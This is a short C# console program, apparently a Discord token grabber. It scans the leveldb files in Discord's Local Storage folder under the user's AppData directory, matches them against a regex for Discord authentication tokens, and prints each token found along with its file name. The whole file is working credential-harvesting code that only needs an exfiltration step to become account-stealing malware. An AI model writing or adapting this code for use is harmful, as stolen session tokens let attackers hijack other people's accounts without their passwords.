using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

class ZeroMemory
{
    public static void Main()
    {

        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+ @"\discord\Local Storage\leveldb";// discord path
        Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"); //regex for token 

        string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);//enumerate all ldb files in leveldb folder

        if (Directory.Exists(path)) //check if directory exist
        {
            foreach (var file in dbfiles)//loop in each file
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);//get all file content
                Match match = regex.Match(contents);//check if match with regex
                if (match.Success)
                {
                    Console.WriteLine("Token Found in :" + Path.GetFileName(file) + "\n" + match.Value);//print the token and filename where it found
                }
            }
        }
        else
        {
            Console.WriteLine("Discord path not found !");
            System.Environment.Exit(1);
        }
        


    }


}
